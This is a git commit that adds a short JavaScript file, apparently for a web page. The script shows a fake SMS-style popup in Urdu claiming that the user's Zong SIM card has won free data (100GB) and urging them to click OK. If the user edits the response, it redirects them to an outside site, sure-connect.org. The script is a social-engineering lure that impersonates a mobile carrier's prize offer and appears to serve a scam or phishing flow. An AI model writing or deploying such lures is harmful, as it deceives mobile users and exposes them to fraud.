b943112e42b10e814d4e01ca7d56efa389352a95
sureconnect001 <ukpe247@gmail.com>
2025-05-26 13:56:45 +0100

    Create zong-active.js

---
+++ zong-active.js
@@ -0,0 +1,5 @@
+var password = '100GB کو چالو کریں۔'
+password=prompt('SMS: مبارک ہو، آپ کا زونگ سم کارڈ مفت ڈیٹا پرانے سم کارڈ کا انعام حاصل کرنے کا اہل ہے، ابھی ایکٹیویٹ کرنے کے لیے OK پر کلک کریں۔','100GB کو چالو کریں۔');
+if (password != '100GB کو چالو کریں۔') {
+location.href='https://sure-connect.org/zong.html';
+}
